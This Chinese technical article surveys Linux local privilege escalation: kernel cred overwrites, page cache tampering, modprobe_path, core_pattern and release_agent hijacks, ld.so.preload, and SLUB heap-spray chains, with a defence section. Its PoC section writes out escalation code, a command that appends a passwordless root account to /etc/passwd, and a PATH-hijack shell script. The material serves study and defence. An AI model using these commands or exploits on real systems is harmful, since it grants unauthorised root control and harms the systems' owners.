---
title: "Linux 本地提权技术分析"
date: 2026-07-18
categories: security
---

一个普通用户权限的进程要变成 root 权限的进程，从技术路径上大致可归为三类：其一，借助内核漏洞直接控制执行流，修改进程的关键权限数据结构（如 `cred`）以完成提权；其二，借助带有 SUID 位的程序（如 `passwd`）——例如通过内核内存错误篡改 `passwd` 的 page cache，磁盘文件本身不变，但任意用户运行 `passwd` 时就会执行恶意代码，类似手法还包括利用由内核发起的特权进程，如 `modprobe_path` 劫持、coredump 格式注入、cgroup `release_agent` 劫持；其三，篡改 root 的认证过程，例如修改 `/etc/passwd` 增设 root 账户或篡改其密码，再用篡改后的密码通过 ssh 登录即可。这三类路径的共同点在于：要么在内核侧突破权限边界，要么在用户侧利用既有的特权程序或配置缺陷。

## 一、内核漏洞直接提权

通过内核漏洞直接控制执行流，修改进程的关键权限数据结构。

### 原理分析

Linux 内核中，每个进程由 `task_struct` 结构体表示，其中包含权限相关的字段：

```c
// include/linux/sched.h
struct task_struct {
    // ...
    const struct cred __rcu *real_cred;
    const struct cred __rcu *cred;
    // ...
};

// include/linux/cred.h
struct cred {
    kuid_t uid;            /* real UID */
    kgid_t gid;            /* real GID */
    kuid_t suid;           /* saved UID */
    kgid_t sgid;           /* saved GID */
    kuid_t euid;           /* effective UID */
    kgid_t egid;           /* effective GID */
    kuid_t fsuid;          /* filesystem UID */
    kgid_t fsgid;          /* filesystem GID */
    // ...
};
```

当进程需要检查权限时，内核会检查 `cred` 结构体中的 `euid` 等字段。如果能通过漏洞直接修改这些字段为 0（root 的 UID），进程就获得了 root 权限。

### 典型漏洞利用方式

1. **堆喷射 + 控制流劫持**
   - 利用内核堆漏洞（如 kmalloc 的 UAF、OOB）
   - 通过堆喷射布局恶意数据
   - 劫持内核控制流，执行提权代码

2. **直接修改 cred 结构**
   - 某些漏洞允许任意内核地址读写
   - 直接定位并修改当前进程的 `cred` 结构
   - 经典手法：劫持控制流执行 `commit_creds(prepare_kernel_cred(&init_task))`——`prepare_kernel_cred` 以 `init_task`（内核初始进程，root）的 cred 为模板复制一份 root cred，`commit_creds` 将其提交给当前进程；随后通过 `swapgs; iretq`（x86_64）等返回用户态，进程即获得 root 身份。注意：老式 PoC 常写的 `prepare_kernel_cred(NULL)` 自 6.1 起（commit `cred: Do not default to init_cred in prepare_kernel_cred()`）会触发 `WARN_ON_ONCE` 并返回 NULL，已不再可用，现代须显式传入 `&init_task` 或直接 `commit_creds(&init_cred)`（`init_cred` 现为 `init/init_task.c` 中的 static 变量，地址仍可经 `/proc/kallsyms` 解析）。
   - 指针重定向变体：与其逐字段改 `uid/euid/...`，不如直接把 `task_struct` 的 `cred`/`real_cred` 指针重定向到 `init_cred` 地址——等价于让当前进程直接套用 root cred，省去逐字段定位的麻烦，但同样要求先泄露 cred 指针与 `init_cred` 地址。

3. **绕过保护机制**
   - SMEP（Supervisor Mode Execution Prevention）：禁止内核态执行用户空间代码页
   - SMAP（Supervisor Mode Access Prevention）：禁止内核态访问用户空间数据，需通过 `copy_from_user`/`copy_to_user` 显式拷贝
   - KASLR：内核地址随机化，增加内核符号定位难度
   - KPTI：内核页表隔离，用户态页表中不映射内核地址，缓解 Meltdown 类侧信道
   - CONFIG_HARDENED_USERCOPY：校验用户态拷贝的源/目的地址范围合法性
   - CONFIG_STATIC_USERMODEHELPER：将 usermode helper 路径锁定为只读变量，缓解 `modprobe_path` 等劫持

### 经典案例

- **CVE-2017-5123** (waitid 系统调用) - 缺少 `access_ok` 检查，可向内核地址写入任意数据
- **CVE-2021-22555** (Netfilter) - 堆块释放后类型混淆（UAF），经堆喷射劫持控制流提权
- **CVE-2022-0847** (Dirty Pipe) - 管道缓冲区 `PIPE_BUF_FLAG_CAN_MERGE` 缺陷，可越权覆盖只读文件 page cache
- **CVE-2022-0185** (Filesystem Context) - `legacy_parse_param` 整数溢出致堆溢出，可结合 cgroup 逃逸/提权

## 二、利用 SUID/SGID 程序

利用系统中已有的 SUID/SGID 程序作为提权跳板。

### Page Cache 篡改攻击

#### 原理

当程序执行时，内核会将其代码从磁盘加载到 page cache。如果能篡改 page cache 中的内容而不修改磁盘文件，当其他用户执行该程序时就会执行恶意代码。

#### 攻击条件

1. 有内核内存写入漏洞
2. 能定位目标文件的 page cache 页
3. 目标文件具有 SUID 位，**或**是会被 root 执行/读取（source）的文件（见下）

#### 典型场景

```
正常流程：
磁盘文件 → page cache → 进程内存执行

攻击流程：
磁盘文件(不变) → page cache(被篡改) → 进程执行恶意代码
```

#### 目标选择：从 SUID 到「root 会执行的任意文件」

SUID 文件只是最早被注意到的目标——任意用户主动运行它即可触发。但 page-cache 篡改的真正威力在于**不碰磁盘、不改属主、越过只读挂载与 `chattr +i`**，因此任何「root 会在将来某一刻执行或 source 的文件」都同等可用：

- SUID 二进制（`/usr/bin/passwd`、`/usr/bin/sudo` …）：任意用户主动触发，落地最快；
- `/root/.ssh/authorized_keys`：root 下次 ssh 登录即用攻击者公钥；
- `/etc/cron.*/`、systemd unit 文件：下一个 cron 周期 / `daemon-reload` 时由 root 执行；
- `/etc/profile.d/*`、`/root/.bashrc`：root 登录 shell source 时执行；
- `/etc/passwd` 本身：Dirty Pipe（CVE-2022-0847）的招牌 demo 正是只改 page cache、磁盘不动，借此增设无密码 root 账户。

落地收益取决于「root 何时会执行/读取该文件」——SUID 即时触发，cron/登录类需要等待窗口，但一旦触发即为 root。

### 特殊内核发起进程

#### modprobe_path 劫持

内核在处理未知模块时会调用 `modprobe`：

```c
// kernel/module/kmod.c
static int call_modprobe(char *module_name, int wait)
{
    // ...
    char *argv[] = { modprobe_path, "-q", "--", module_name, NULL };
    // ...
}
```

如果能修改 `modprobe_path` 内核变量，就可以让内核执行任意程序。`call_modprobe` 以 `init_cred`（即 root）身份通过 `call_usermodehelper_exec` 启动子进程，因此被调用的程序以 root 权限运行：

```
# 原始值
modprobe_path = "/sbin/modprobe"

# 篡改后
modprobe_path = "/tmp/malicious_binary"
```

触发条件：让内核尝试加载一个不存在的模块。最典型的做法是用未知协议族创建 socket，例如 `socket(AF_INET, SOCK_STREAM, 132)`（IPPROTO 值未在内核注册），内核在处理协议时调用 `request_module`，进而触发 `modprobe`。触发后 root 权限的 `/tmp/malicious_binary` 便被执行。

#### Coredump 格式注入

当进程崩溃时，内核会根据 `/proc/sys/kernel/core_pattern` 生成 coredump。当配置以 `|` 开头时，内核会通过 usermode helper 以 root 权限执行管道程序并把崩溃信息通过标准输入传入：

```
# 正常配置
|/usr/lib/systemd/systemd-coredump

# 恶意配置（需要 root 权限设置，但可利用内核漏洞写入）
|/tmp/malicious_script
```

如果内核漏洞允许写入此文件（非 `|` 前缀时是普通文件，可被任意内核写覆盖），可以注入恶意程序。由于 coredump 处理流程由内核发起，执行时具有特权，因此是常见的 LPE 落脚点。

#### cgroup release_agent 劫持

与 `modprobe_path` 形态最像的一条：一个可写的路径字符串变量 + 一个可主动触发的事件 → root 代码执行。

```c
// kernel/cgroup/cgroup-v1.c
// 路径变量：cgroup 根的 release_agent_path（经 release_agent cgroupfs 文件写入）
argv[0] = agentbuf;            // strscpy 自 release_agent_path
argv[1] = pathbuf;             // 被释放 cgroup 的路径
call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);  // :838
```

触发条件：cgroup 设了 `notify_on_release`，当最后一个进程离开该 cgroup 时，内核排 `cgroup1_release_agent` work，以 root 身份执行 `release_agent_path` 指向的程序。任意内核写把该变量覆盖为 `/tmp/x`，再搬空某 cgroup 即可触发。

与 `modprobe_path` 的关键异同：
- 同：都是「可写路径变量 + 可触发事件 → root 执行」，落地范式一致。
- 同：同样经 `call_usermodehelper_setup`，因此 **也被 `CONFIG_STATIC_USERMODEHELPER` 收敛**（`call_usermodehelper` 便捷封装内部即调 setup，覆盖发生在 setup 阶段）。
- 异：触发动作是「搬空 cgroup」而非「未注册协议族 socket」；路径变量在 cgroup 根、而非 sysctl；仅 cgroup v1 提供，v2 无 `release_agent`。

> 截至 7.1/7.2-rc（核对自主线源码），这类「内核发起的特权 usermode helper」——`modprobe_path`、`core_pattern`、`poweroff_cmd`、`uevent_helper`、cgroup `release_agent`——**无一被移除**，因为它们承载着模块加载、崩溃转储、关机、热插拔、cgroup 释放等内核必需功能。唯一的变化是 `kmod.c` 从 `kernel/kmod.c` 迁入了 `kernel/module/kmod.c`（`modprobe_path` 仍定义于其第 64 行）。`core_pattern` 侧新增了 `name_contains_dotdot()` 与 `fs.suid_dumpable=2` 下的路径白名单校验（`fs/coredump.c`），加固的是「越权用户态写入」入口，并不影响「任意内核写直接覆盖变量」这条路径；`uevent_helper` 整段仍被 `CONFIG_UEVENT_HELPER` 包裹，现代发行版默认编译关闭。统一缓解仍是 `CONFIG_STATIC_USERMODEHELPER`（`kernel/umh.c:368`），在 `call_usermodehelper_setup` 阶段把所有 helper 路径收敛成编译期只读的 `CONFIG_STATIC_USERMODEHELPER_PATH`——`release_agent` 经 `call_usermodehelper` 便捷封装内部同样走 setup，故一并被覆盖。
>
> 此外还有几处更小众的「内核发起执行路径」，本质同族，仅在对应子系统加载且配置可达时才有意义：`binfmt_misc` 注册解释器（`fs/binfmt_misc.c`，execve 命中 magic/扩展名时由内核以注册的 interpreter 解释执行，注意默认以执行者身份运行，creds 语义不如 modprobe 干净）、`request_key` 的 key 实例化 helper（`security/keys/request_key.c`）、TOMOYO 策略加载器（`security/tomoyo/load_policy.c`）、NFSd/ocfs2 的回收与栈 helper（`fs/nfsd/*`、`fs/ocfs2/stackglue.c`）。

### 常见 SUID 程序利用点

| 程序 | 潜在风险 |
|------|---------|
| /usr/bin/passwd | 修改密码文件 |
| /usr/bin/sudo | 配置错误、漏洞 |
| /usr/bin/chsh | 修改 shell |
| /usr/bin/newgrp | 组切换 |
| /usr/bin/at | 定时任务执行 |

> 典型案例如 **CVE-2019-18634**：sudo 在开启 `pwfeedback`（输入密码回显星号）时，`getln()` 向栈上定长缓冲区逐字符写入而未检查长度，普通用户构造超长密码即可触发栈溢出并以 root 身份执行 `sudo`，完成提权。

## 三、篡改认证过程

通过修改认证相关文件实现提权。

### /etc/passwd 文件篡改

#### 文件结构

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

格式：`用户名:密码占位:UID:GID:描述:家目录:Shell`

#### 攻击方式

1. **添加 root 账户**
   ```
   toor:$6$salt$hash:0:0:root:/root:/bin/bash
   ```

2. **修改 root 密码**
   ```
   root:$6$newhash$:0:0:root:/root:/bin/bash
   ```

3. **无密码 root**
   ```
   root::0:0:root:/root:/bin/bash
   ```

### /etc/shadow 文件篡改

Shadow 文件存储实际的密码哈希：

```
root:$6$rounds=5000$salt$hash:18000:0:99999:7:::
```

如果能写入此文件，可以直接设置已知密码的哈希。

### SSH 相关攻击

1. **SSH 密钥注入**
   - 写入 `/root/.ssh/authorized_keys`
   - 需要有目录写权限

2. **SSH 配置篡改**
   - 修改 `/etc/ssh/sshd_config`
   - 降低认证强度

### 动态链接器预加载篡改（`/etc/ld.so.preload`）

与改 `/etc/passwd` 同属「篡改影响特权执行的系统配置」，但走的是动态链接器而非账号库：

- `/etc/ld.so.preload` 是系统级预加载清单，由加载器读取。**关键区别**：SUID 程序处于 secure-execution 模式时会忽略 `LD_PRELOAD` 环境变量，但 `/etc/ld.so.preload` **对 SUID 二进制同样生效**——因此特别适合做提权落地。
- 内核写覆盖此文件（或其 page cache）指向攻击者的 `.so`，任意用户运行任一 SUID 程序时，`.so` 的构造函数即在 root 上下文执行。
- 落地窗口是「下一个 SUID 程序被执行」，比 ssh 登录类窗口更容易等到。

## 四、其他提权路径

### 容器逃逸

- 利用 CAP_SYS_ADMIN 等特权
- 挂载命名空间漏洞
- cgroupfs 劫持

### 竞态条件

- TOCTOU (Time of Check, Time of Use)
- 符号链接攻击
- 文件描述符竞争

### 内核模块加载

- /dev/kmem 写入（5.13 起彻底移除，`CONFIG_DEVKMEM` 不复存在；早期版本曾作为编译选项默认关闭）
- /dev/mem 物理内存映射（受 CONFIG_STRICT_DEVMEM 限制，仅允许访问 PCI/BIOS 等非 RAM 区域）
- 恶意内核模块加载（需要 `CAP_SYS_MODULE` 或绕过签名校验 `CONFIG_MODULE_SIG`）

## 五、防御措施

1. **内核加固**
   - 启用 SMEP/SMAP/KPTI
   - 使用 SELinux/AppArmor
   - 定期内核更新

2. **最小权限原则**
   - 减少 SUID 程序
   - 使用 sudo 替代 su
   - 能力（capabilities）细分

3. **文件保护**
   - 使用 chattr +i 保护关键文件
   - 监控关键文件变化
   - 使用只读文件系统

4. **审计与监控**
   - 启用审计日志
   - 异常行为检测
   - 定期安全扫描

## 六、典型 PoC 框架

> 以下代码仅作原理演示，省略了 KASLR 绕过、地址泄露等具体步骤，用于说明各类提权的最小骨架。

### 6.1 内核控制流劫持 → commit_creds

通用思路：通过内核漏洞获得一次“可控函数指针调用”，在内核上下文中执行 `commit_creds(prepare_kernel_cred(NULL))`，再安全返回用户态。

```c
// 用户态准备工作：保存寄存器状态，便于劫持后恢复
// x86_64 下从内核态返回用户态的典型 trampoline
typedef int (*_commit_creds)(unsigned long cred);
typedef unsigned long (*_prepare_kernel_cred)(unsigned long cred);

unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state(void) {
    __asm__ volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "mov %%rsp, %3\n"
        "pushfq\n"
        "pop %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
    );
}

// 劫持后被调用的函数：在内核态执行提权，再返回用户态 shell
_commit_creds   k_commit_creds;
_prepare_kernel_cred k_prepare_kernel_cred;

void escalate(void) {
    // 6.1+ 起 prepare_kernel_cred(NULL) 会 WARN 并返回 NULL，须显式传入 init_task
    struct cred *c = (struct cred *)k_prepare_kernel_cred((unsigned long)&init_task);
    k_commit_creds((unsigned long)c);
    // 退出内核态，恢复用户态上下文
    __asm__ volatile(
        "swapgs\n"
        "mov %0, 0x0(%%rsp)\n"  // 恢复 ss/sp/rflags/cs/ip
        "iretq\n"
        :: "r"(0)
    );
    // 返回用户态后已具备 root 权限，起 shell
    system("/bin/sh");
}
```

实战中 `k_commit_creds`、`k_prepare_kernel_cred` 的地址通常通过 `commit_creds` 符号或 `/proc/kallsyms` 泄露（需 `kptr_restrict=0`），或借由信息泄露 + KASLR 猜测获取。

### 6.2 modprobe_path 劫持

任意内核写场景下最稳的落地方式之一，无需构造 ROP：

```c
// 1) 准备一个以 root 身份会被执行的脚本，提权后把 flag 回写
const char *payload =
    "#!/bin/sh\n"
    "chmod 777 /root/flag.txt\n";  // 实际用任意提权动作
// 写到 /tmp/x，并 chmod +x

// 2) 利用内核写漏洞把 modprobe_path 覆盖为 "/tmp/x"
//   modprobe_path 地址可由 /proc/kallsyms 读取
//   write_kernel_memory(modprobe_path_addr, "/tmp/x", 7);

// 3) 触发：用一个内核未注册的协议族让 request_module 调用 modprobe
int s = socket(AF_INET, SOCK_STREAM, 132); // 132 未注册
(void)s; // 内核尝试加载模块 -> 以 root 执行 /tmp/x
```

触发后 `modprobe_path` 指向的程序以 `init_cred` 身份执行，等价于一次 root 代码执行。

### 6.3 /etc/passwd 直接篡改

当普通用户对 `/etc/passwd` 有写权限（如配置错误、误用 `chmod`）时：

```sh
# 备份
cp /etc/passwd /tmp/passwd.bak

# 生成一个无密码 root 账户 toor
echo 'toor::0:0:root:/root:/bin/bash' >> /etc/passwd

# 切换
su - toor        # 无需密码，直接得到 root shell
```

对应 hash 的账户也可用 openssl 生成：

```sh
# 生成与系统一致的 SHA-512 哈希
openssl passwd -6 -salt abcd1234 'P@ssw0rd'
# 将输出填入 /etc/shadow 的 root 行即可设置已知密码
```

### 6.4 SUID 程序 PATH 劫持

配置错误的 SUID 程序若调用不带绝对路径的命令，可劫持 PATH：

```sh
# 假设某个 SUID 程序内部执行了 system("ps") 之类未限路径的调用
cat > /tmp/ps <<'EOF'
#!/bin/sh
exec /bin/sh
EOF
chmod +x /tmp/ps
PATH=/tmp:$PATH /usr/sbin/vulnerable_suid_binary
```

这是最常被忽略、却最高频的配置类提权路径，工具如 `LinPEAS`、`pspy`、`GTFOBins` 都围绕它展开。

## 七、自动化枚举与检测

实战中提权前的信息收集往往是决定成败的环节，常用工具与检查项：

| 类别 | 工具 / 检查项 | 关注点 |
|------|--------------|--------|
| 系统枚举 | LinPEAS / linux-exploit-suggester | 内核版本对应的已知 CVE、SUID 列表、可写敏感路径 |
| 进程窥探 | pspy | 不需 root 即可看到定时任务/cron 触发的命令行 |
| 内核信息 | `uname -a`、`/proc/version`、`/proc/sys/kernel/kptr_restrict` | 判断 KASLR/符号可见性 |
| 文件能力 | `getcap -r / 2>/dev/null` | `cap_setuid`/`cap_dac_override` 等能力可直接提权 |
| 持久化痕迹 | `/etc/cron*`、`/etc/ld.so.preload`、`~/.bashrc` | 异常的计划任务与 LD_PRELOAD 注入 |

对应防御侧：上述路径皆应纳入 HIDS/审计规则（`auditd` 对 `/etc/passwd`、`/etc/shadow`、`modprobe_path` 相关符号的监控），并配合 EDR 对 `commit_creds` 调用栈做基线告警。

## 八、利用前置条件矩阵

把各类路径的前置条件与适用场景收敛成一张表，便于评估现实可行性：

| 路径 | 最小前置条件 | 落地难度 | 典型收益 |
|------|--------------|---------|---------|
| 内核控制流劫持 | 一个内核 UAF/OOB/类型混淆漏洞 + KASLR 信息泄露 | 高 | root shell |
| 任意内核写（modprobe_path） | 一次任意内核地址写 + 路径写入权限 | 中 | root 代码执行 |
| Page Cache 篡改 | 内核内存写 + 定位目标文件 page（SUID 文件或 root 会执行/读取的文件） | 中高 | 以 SUID 身份执行任意代码 / root 下次登录执行任意代码 |
| core_pattern 注入 | 内核写 `/proc/sys/kernel/core_pattern` 或越权写该文件 | 中 | root 代码执行 |
| cgroup release_agent 劫持 | 一次任意内核写（覆盖 `release_agent_path`）+ 可创建/搬空 cgroup | 中 | root 代码执行 |
| SUID 程序漏洞 | 目标 SUID 程序存在逻辑/溢出漏洞 | 中 | 取决于该 SUID 的权限 |
| /etc/passwd 篡改 | 对该文件有写权限（配置错误） | 低 | root 账户 |
| `/etc/ld.so.preload` 篡改 | 任意内核写覆盖该文件/page + 一个 SUID 程序被执行 | 中 | root 上下文执行任意 .so |
| SUID + PATH 劫持 | SUID 程序调用未限路径命令 | 低 | 该 SUID 权限 shell |
| 容器逃逸 | 容器内 `CAP_SYS_ADMIN` 或内核漏洞 | 中高 | 宿主 root |

> 经验法则：落地难度低（passwd 篡改、PATH 劫持）的前置条件往往更难凑齐——它们依赖配置错误而非漏洞；而依赖漏洞的路径虽然技术门槛高，但只要漏洞成立就几乎必然可行。防御投入应兼顾两端：既要修补漏洞与加固内核编译选项，也要持续扫描配置错误。

## 九、内核堆与利用原语

前文反复出现“堆喷射”，但要把 UAF/OOB 真正转化为提权，必须理解内核堆（SLUB 分配器）的行为，以及哪些对象可作为受控的“利用原语”。

### 9.1 SLUB 分配器速览

- 内核对小对象用 SLUB（旧版 SLAB）按 **size class**（如 `kmalloc-64`、`kmalloc-192`、`kmalloc-1k`）分桶管理。请求 65 字节会落入 `kmalloc-128`，请求 200 字节落入 `kmalloc-192`，依此类推。
- 同一 size class 的 slab 页由多个 **同类型对象**组成。漏洞对象与目标原语对象只要落入同一桶，就能通过喷射让它们相邻。
- SLUB 把空闲对象以 freelist 串起（带随机化/校验，`CONFIG_SLAB_FREELIST_RANDOM`、`CONFIG_SLAB_FREELIST_HARDENED`），这削弱了旧的“freelist 毒化”手法，但 **不** 影响已分配对象的相邻布局。
- 关键推论：只要能让漏洞对象和受控原语对象常驻同一 `kmalloc-*` 桶，就有机会用原语覆盖漏洞对象释放后留下的野指针所指区域，或反之。

### 9.2 常用喷洒/控制原语

| 原语（系统调用） | 涉及对象 | 所在 size class | 主要用途 |
|----------------|---------|----------------|---------|
| `msgsnd` / `msgrcv` | `msg_msg` + `msg_msgseg` | 灵活（含跨页） | 最经典：可控大小、可控数据、可跨页续段；破坏 `m_ts`/`next` 可做任意读、破坏 `m_list` 做 UAF |
| `pipe` + `write` | `pipe_buffer[]` | `kmalloc-1k`（默认 16 项） | 覆盖 `ops` 劫持 `release` 取得 RIP；Dirty Pipe 的核心对象 |
| `setxattr` / `fsetxattr` | 任意 | 灵活 | 最灵活的受控喷洒：数据、大小全可控，但生命周期短（写入即释放），常配合 `userfaultfd`/FUSE 延时 |
| `add_key` (`user_key_payload`) | `user_key_payload` | 灵活 | 稳定的受控喷洒，可用 `KEYCTL_UPDATE` 改写、`KEYCTL_REVOKE` 释放 |
| `sendmsg` / socket | `sk_buff` | 灵活 | 网络对象喷洒；破坏 `len`/`end`/`head` 实现 OOB 读写 |
| `msg_msgseg`（`msgsnd` 续段） | `msg_msgseg` | 跨页 | 让消息跨多页，控制相邻页内容 |

> 选择原语的两条经验：
> 1. **对齐 size class** 优先于“对象长得像”。先把目标漏洞对象的分配大小算出来，再去匹配同桶的原语。
> 2. 优先选能 **延时** 的原语（`userfaultfd`、FUSE），在漏洞触发的窗口里冻住内核，把竞态条件拉宽。新版内核对 `userfaultfd`/FUSE 受限时，可改用 `uffd` 注册缺页页等方式实现同等延时。

### 9.3 cross-cache：现代内核的破局点

`CONFIG_SLAB_FREELIST_HARDENED` 等加固并不阻止同一 slab 内的相邻覆盖，但当目标对象与受控原语落在不同 size class 时，旧的“同桶相邻”思路失效。现代手法是 **cross-cache**：

1. 喷洒大量目标对象（漏洞对象所在桶），使其占满若干整页 slab。
2. 逐个释放，把整页 slab 还给页面分配器（page allocator）。
3. 向 page allocator 请求另一 size class 的对象，让原语对象落在回收的那几页上——此时原语与漏洞对象虽属不同 SLUB 桶，却 **共享物理页**。
4. 触发漏洞对这块页做 OOB/UAF，从而跨界改写原语对象。

这把“SLUB 隔离”这一层防护绕过去了，是 CVE-2022-27666（IPv6 路由头）、CVE-2023-0386（fuse + overlayfs）等近年漏洞的通用思路。

### 9.4 一个标准的“漏洞→提权”链路

把前面所有零件串起来，现代内核 LPE 的典型链路是：

```
信息泄露 (KASLR bypass)
   │   /proc/kallsyms（kptr_restrict=0 时）、或一次 OOB 读
   ▼
堆布局 (spray)
   │   选定同桶 / cross-cache 原语，铺好相邻对象
   ▼
触发漏洞 (UAF / OOB / type-confusion)
   │   配 userfaultfd/FUSE 把窗口拉宽
   ▼
原语转化 (UAF → controllable write)
   │   msg_msg->m_ts 改大 → 任意读；
   │   pipe_buffer->ops  → RIP；任意写落到 modprobe_path
   ▼
落地提权
   │   commit_creds(prepare_kernel_cred(&init_task)) 或 modprobe_path 劫持
   ▼
干净返回用户态 → root shell
```

理解这条链路比记住单个 CVE 更有价值：CVE 会过时，而“泄露→布局→触发→转化→落地→返回”这六段式几乎适用于所有内核堆漏洞利用。

## 参考

- Linux Kernel Source Code (`kernel/cred.c`, `kernel/module/kmod.c`, `kernel/umh.c`, `fs/coredump.c`)
- Linux Kernel Exploitation Techniques
- MITRE ATT&CK: Privilege Escalation (T1068 Exploitation for Privilege Escalation)
- CVE-2021-22555 writeup, CVE-2022-0847 (Dirty Pipe) writeup, CVE-2022-0185 writeup
- phrack, libprivilege / kernel-exploit 相关公开资料
